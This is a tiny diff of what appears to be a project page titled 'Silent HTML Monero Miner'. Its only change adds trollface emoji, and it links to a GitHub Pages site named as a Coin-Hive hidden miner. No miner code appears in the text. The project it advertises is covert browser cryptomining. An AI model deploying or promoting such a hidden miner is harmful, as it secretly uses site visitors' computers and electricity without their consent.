@@ -2,7 +2,7 @@
 
 <h2>Silent HTML Monero Miner</h2>
 
- :trollface: :trollface: :trollface: :trollface: :trollface: :trollface:
+ :trollface: :trollface: :trollface: :trollface: :trollface: :trollface::trollface: :trollface: :trollface: :trollface: :trollface: :trollface:
 
 https://jonnybanana.github.io/Coin-Hive_Hidden-Miner.github.io/
 
